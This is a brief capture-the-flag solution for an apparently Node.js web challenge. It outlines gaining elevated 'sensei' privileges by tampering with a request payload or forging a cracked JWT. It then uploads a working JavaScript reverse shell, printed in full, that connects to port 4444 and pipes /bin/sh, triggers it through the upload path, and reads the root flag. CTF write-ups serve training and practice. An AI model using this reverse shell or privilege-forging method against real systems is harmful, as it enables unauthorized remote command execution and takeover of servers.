# Solution

1. Create an account with sensei privileges (intercept & update payload)
2. OR crack the JWT and forge a token with sensei privs
3. Upload a JS reverse shell 
`(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "127.0.0.1", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();`
4. Setup a listener
5. Use the update functionality to trigger (you might need to fuzz to find the file, but it's somewhere very logical)
`/public/uploads/rev.js`
6. Flag is in root.txt
